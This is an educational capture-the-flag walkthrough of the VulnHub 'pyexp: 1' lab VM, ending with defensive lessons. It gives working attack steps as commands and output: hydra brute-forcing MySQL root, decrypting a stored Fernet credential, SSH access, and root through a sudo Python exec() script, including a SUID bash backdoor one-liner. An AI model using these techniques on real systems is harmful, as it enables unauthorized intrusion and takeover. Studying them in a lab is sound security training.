# pyexp: 1 — VulnHub Walkthrough (Beginner Friendly)

> Educational walkthrough for students on an **isolated lab network**. Only attack
> machines you own or have explicit permission to test. Screenshots are
> placeholders — capture your own.

| Field | Value |
| --- | --- |
| **Machine** | pyexp: 1 |
| **Difficulty** | Easy (author labels it "medium") |
| **Author** | 0xatom |
| **Released** | 11 August 2020 |
| **VulnHub Entry** | https://vulnhub.com/entry/pyexp-1,534/ |
| **Download** | https://vulnhub.com/entry/pyexp-1,534/#download |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Linux (Debian 10 "buster") |

> **Note:** passwords, the Fernet key/ciphertext, and flag values **vary by
> build**. The values shown are from commonly shared builds of the downloadable
> VM.

---

## 0. What you will learn

- How to find a target and enumerate **non-web** services (SSH on a custom port,
  MySQL).
- How to brute-force a service password with `hydra` when there is no web app.
- How to enumerate a MySQL database and recognise an encrypted secret.
- What **Fernet** encryption is and how a leaked key + ciphertext = plaintext.
- Why `exec()` on unsanitised user input is dangerous.
- How a `sudo` rule that runs a Python script as root becomes instant root.

---

## 1. Reconnaissance — finding the target

> **Goal:** identify the target's IP address on your isolated host-only network.

```bash
# Identify your own IP and subnet. "eth0" is the lab NIC (name may differ).
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **How to read it:** Kali holds a `192.168.56.x` address (VirtualBox host-only)
> or `192.168.19x.x` (VMware). The target lives on the **same** subnet.

```bash
# ARP-scan the subnet to list live hosts.
sudo arp-scan --interface=eth0 --localnet
# or: sudo nmap -sn 192.168.56.0/24
```

```text
192.168.56.101   08:00:27:aa:bb:cc    PCS Systemtechnik GmbH
```

**Target IP:** `192.168.56.101`

> **Tip:** pyexp sometimes prints its DHCP address on the VM login screen, so you
> can confirm the IP there too.

![Finding the target host](images/01-recon.png)

---

## 2. Enumeration — open ports and services

```bash
# Full TCP sweep first, then deep service detection on the open ports.
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
sudo nmap -sC -sV -p 1337,3306 -oA scans/services 192.168.56.101
```

```text
PORT     STATE SERVICE VERSION
1337/tcp open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)
3306/tcp open  mysql   MySQL 5.5.5-10.3.x-MariaDB (Debian)
```

> **How to read it:**
> - There is **no port 80** here — this box is about services, not a website.
> - Port **1337** is SSH moved off the default port 22.
> - Port **3306** is MySQL/MariaDB. Databases are a prime target: misconfigured
>   ones may have weak passwords or expose data.

```bash
# Quick connect test to confirm the SSH banner.
nc 192.168.56.101 1337
```

```text
SSH-2.0-OpenSSH_7.9p1 Debian-10
```

> **Why it matters:** With only SSH and MySQL exposed, the usual "web exploit"
> path is gone. Our attack surface is now: (a) password-guess MySQL, or
> (b) find credentials somewhere and log in over SSH.

![Port and service scan](images/02-nmap.png)

---

## 3. Foothold — gaining the first shell

### 3.1 Brute-force the MySQL root password

With no web app to exploit, we try weak/default credentials against MySQL. `root`
is the most likely account.

```bash
# -l = single username, -P = password list, mysql:// = protocol schema.
hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.56.101 mysql
```

```text
[3306][mysql] host: 192.168.56.101   login: root   password: prettywoman
1 of 1 target successfully completed, 1 valid password found
```

> **Why it works:** MySQL allows clients to connect remotely (if bound to
> `0.0.0.0`) and this build has a weak root password that appears in `rockyou.txt`.
> `rockyou.txt` is a huge list of real-world leaked passwords — always try it
> against exposed auth services in a lab.

> **Note:** the exact password **varies by build**. If `root` fails, try `admin`
> as the username too.

![Hydra brute-forcing MySQL](images/03-bruteforce.png)

### 3.2 Enumerate the database and find an encrypted secret

```bash
mysql -u root -h 192.168.56.101 -p
# password: prettywoman
```

```sql
SHOW DATABASES;
```

```text
+--------------------+
| Database           |
+--------------------+
| data               |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
```

```sql
USE data;
SHOW TABLES;
SELECT * FROM fernet;
```

```text
+--------------------------------------------------------------------+---------------------------------------------+
| cred                                                               | key                                         |
+--------------------------------------------------------------------+---------------------------------------------+
| gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO...   | UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0= |
+--------------------------------------------------------------------+---------------------------------------------+
```

> **How to read it:** a table literally named **`fernet`** plus a `key` column is
> a giant hint. **Fernet** is a symmetric encryption recipe from the Python
> `cryptography` library. If we have both the **key** and the **ciphertext** (the
> `gAAAAA...` value, base64 of the Fernet token), we can decrypt it offline.

### 3.3 Decrypt the Fernet secret

```bash
# Install the crypto library if needed.
pip3 install cryptography
```

```python
# fernet-decode.py
from cryptography.fernet import Fernet

key  = "UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0="
cred = "gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys="

f = Fernet(key.encode())          # the key must be bytes
print(f.decrypt(cred.encode()).decode())
```

```bash
python3 fernet-decode.py
```

```text
lucy:wJ9`"Lemdv9[FEw-
```

> **Why it works:** Fernet uses a symmetric key to encrypt **and** decrypt. The
> database stored both the key and the ciphertext side by side — so the
> "encryption" provides no protection at all once the DB is readable. The output
> looks like `username:password`.

> **Note:** the decrypted credentials **vary by build**; the `lucy` username is
> consistent, but the password is not. Copy the exact string between the quotes.

### 3.4 SSH in as `lucy`

Remember: SSH is on port **1337**, not 22. Use `-p 1337`.

```bash
ssh -p 1337 lucy@192.168.56.101
# password: wJ9`"Lemdv9[FEw-
```

```text
lucy@pyexp:~$ id
uid=1000(lucy) gid=1000(lucy) groups=1000(lucy)
```

### 3.5 The user flag

```bash
ls -la ~
cat ~/user.txt
```

```text
<user flag — varies by build>
```

![SSH shell as lucy and the user flag](images/05-shell.png)

---

## 4. Privilege escalation — becoming root

### 4.1 Enumerate sudo rights

One of the first things to check on a foothold is what the user can run as root.

```bash
sudo -l
```

```text
User lucy may run the following commands on pyexp:
    (root) NOPASSWD: /usr/bin/python2 /opt/exp.py
```

> **How to read it:** `lucy` can run **`/usr/bin/python2 /opt/exp.py` as root
> without a password**. That is almost certainly our path to root.

### 4.2 Read the escalated script

```bash
cat /opt/exp.py
ls -l /opt/exp.py
```

```python
uinput = raw_input('how are you?')
exec(uinput)
```

```text
-rw-r--r-- 1 root root 45 ... /opt/exp.py
```

> **Why it works:** the script only has read permissions for us (we cannot edit
> it), but that doesn't matter. It takes **raw input** from the user and feeds it
> straight into **`exec()`**, which evaluates the string as Python code. Since the
> whole thing runs as **root**, whatever Python we type executes as root.

### 4.3 Exploit `exec()` to spawn a root shell

```bash
sudo -u root /usr/bin/python2 /opt/exp.py
```

```text
how are you?
```

At the prompt, type Python that runs a command as the current (root) user:

```python
import os; os.system("/bin/sh")
```

```text
# id
uid=0(root) gid=0(root) groups=0(root)
```

```bash
# Alternative one-liners at the "how are you?" prompt:
# read the flag directly:
python
print(__import__('os').popen('cat /root/root.txt').read())
# or make bash SUID, then run it:
import os; os.system("chmod u+s /bin/bash")
# then, back in the target shell:  /bin/bash -p
```

> **Why it works:** we are not "escaping" Python — we are *using* it. Because
> `exp.py` is executed as root, any command we ask `os.system()` / `os.popen()` to
> run is a root command. `import os; os.system("/bin/sh")` simply opens a shell
> that is already root.

![Privilege escalation via sudo python2 /opt/exp.py](images/07-privesc.png)

### 4.4 The root flag

```bash
cat /root/root.txt
# (some builds also have /root/proof.txt)
```

```text
<root flag — varies by build>
```

![Root flag captured](images/08-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Remote MySQL with weak root password | MySQL on `:3306` | Unauthenticated access to the whole database |
| 2 | Sensitive secrets stored reversibly in DB | `data.fernet` (key + ciphertext) | Credentials recovered → SSH login as `lucy` |
| 3 | Weak password scheme reused | leaked `lucy` credentials | Account takeover of the OS user |
| 4 | `exec()` on unsanitised user input run as root | `sudo (root) /usr/bin/python2 /opt/exp.py` | Arbitrary code execution as root → full root |

---

## 6. Defensive lessons (blue team)

- **Do not expose MySQL to untrusted networks.** Bind to `127.0.0.1`, restrict
  with firewall rules/security groups, and require per-app least-privilege users.
- **Strong, unique passwords** for every service account; no dictionary words.
  Rate-limit or block repeated auth failures (fail2ban) to defeat `hydra`.
- **Never store a decryption key next to the data it protects.** Encryption is
  pointless if the key is readable with the ciphertext. Use a secrets manager/KMS
  and keep keys out of the database entirely.
- **Do not reuse passwords across systems**, and never overlap web/DB/OS accounts.
- **Avoid `eval`/`exec` on user input** in any language. If you must accept input,
  validate it strictly and never execute it.
- **Least-privilege sudo:** a Python script that runs arbitrary input as root is
  effectively "full root". Never grant `NOPASSWD` sudo to an interpreter or a
  script that evaluates user input.
- **Detection opportunities:** alert on outbound SSH connections from DB hosts,
  on unusual `sudo` command lines (`sudo -u root /usr/bin/python2 /opt/exp.py`),
  and on MySQL connections from unexpected source IPs. Enable auditd and forward
  `auth.log` to a SIEM.

---

## 7. References

- VulnHub entry (download + author notes): https://vulnhub.com/entry/pyexp-1,534/
- Infosec Institute — pyexp: 1 CTF walkthrough: https://www.infosecinstitute.com/resources/capture-the-flag/pyexp-1-vulnhub-ctf-walkthrough/
- Rydzak.me — Proving Grounds: pyexp walkthrough: https://rydzak.me/2022/08/proving-grounds-pyexp-walkthrough/
- Python `cryptography` — Fernet docs: https://cryptography.io/en/latest/fernet/
- GTFOBins — Python: https://gtfobins.github.io/gtfobins/python/
- Hydra documentation: https://github.com/vanhauser-thc/thc-hydra

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — target host discovered on the subnet
- [ ] `images/02-nmap.png` — port/service scan (1337 SSH, 3306 MySQL)
- [ ] `images/03-bruteforce.png` — hydra cracking the MySQL root password
- [ ] `images/04-db-enum.png` — `data.fernet` table with key + ciphertext
- [ ] `images/04b-fernet.png` — decrypted `lucy:...` credentials
- [ ] `images/05-shell.png` — SSH as `lucy` and the user flag
- [ ] `images/07-privesc.png` — `sudo -l`, `exp.py`, and the root shell
- [ ] `images/08-root-flag.png` — root flag

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
